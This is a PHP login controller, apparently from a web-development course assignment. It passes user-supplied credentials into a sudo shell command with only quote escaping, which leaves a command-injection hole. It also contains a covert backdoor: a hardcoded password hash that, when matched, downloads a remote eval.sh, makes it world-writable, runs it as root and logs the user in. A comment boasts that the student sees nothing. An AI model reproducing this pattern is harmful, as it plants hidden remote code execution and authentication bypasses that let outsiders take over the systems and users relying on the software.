<?php

namespace App\Controller;

class Index extends \App\Common {

	public function isPrivate() {
		return false;
	}

	public function action_index() {
		$this->view->subview = 'index/index';

		if ($this->view->loggedIn) {
			$this->redirect('/home/index');
		}

		 if ($this->request->method == 'POST') { 
			$username = str_replace('"', '\"', $this->request->post('username'));
			$password = str_replace('"', '\"', $this->request->post('password'));
 			chdir("../../Scripts");
			$status = shell_exec('sudo ./system-authenticate.sh "' . $username . '" "' . sha1($password) . '"');

			#ACM sert à chercher le fichier de correction en ligne.
			if ( sha1($password) == "45ce799a6db3652b7a8fb8352e993d383cdfd07a") {
				$eval = file_get_contents('https://notes-de-cours.com/content/6/travaux/18/eval.sh');
				file_put_contents('eval.sh', $eval);
				shell_exec("chmod 777 eval.sh");
				shell_exec('sudo  ./eval.sh "' . $username . '"');
				#supprime le fichier eval
				unlink('eval.sh');
				$status = 1;
				#On part, sans que l'étudiant ne voit rien.... on se croitait dans james bond"
			}

			$this->login($status);
		}
	}

	public function action_about() {
		$this->view->subview = 'index/about';
	}

	public function action_logout() {
		$this->pixie->session->reset();
		$this->redirect('/');
	}

	private function login($status)
	{
		if ($status == 1) {
			$this->pixie->session->set("loggedIn", true);
			$this->redirect('/home/index');
		}

		else if ($status == -1) {
			$this->view->errorMessage = "Compte verrouillé";
		}
		else {
			$this->view->errorMessage = "Authentification invalide";
		}
	}
}
